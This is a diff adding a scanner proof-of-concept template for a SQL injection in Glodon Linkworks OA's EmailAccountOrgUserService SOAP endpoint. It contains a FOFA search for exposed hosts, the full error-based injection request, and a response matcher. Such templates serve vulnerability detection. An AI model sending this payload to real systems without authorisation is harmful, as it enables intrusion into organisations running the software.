@@ -1,0 +1,36 @@
+id: poc-yaml-glodon-emailaccountorguserservice-sqli
+info:
+  name: 广联达OA EmailAccountOrgUserService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 广联达 Linkworks办公OA
+  fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx"
+    || banner="Services/Identification/login.ashx"
+requests:
+- method: POST
+  path: /Mail/Services/EmailAccountOrgUserService.asmx
+  headers:
+    Content-Type: text/xml
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetUserInfosByEmail xmlns="http://tempuri.org/">
+
+    <email>'') AND 5452 IN (SELECT (char(112)+char(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+char(112)+char(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)))
+    AND (''oCSe''=''oCSe</email>
+
+    </GetUserInfosByEmail>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 500 && contains(body,"将 varchar 值") && contains(body,"转换成数据类型")
+    && contains(body,"失败") && contains(body,"pqqxzpqpqqxzpq")
+variables: {}
+transport: http
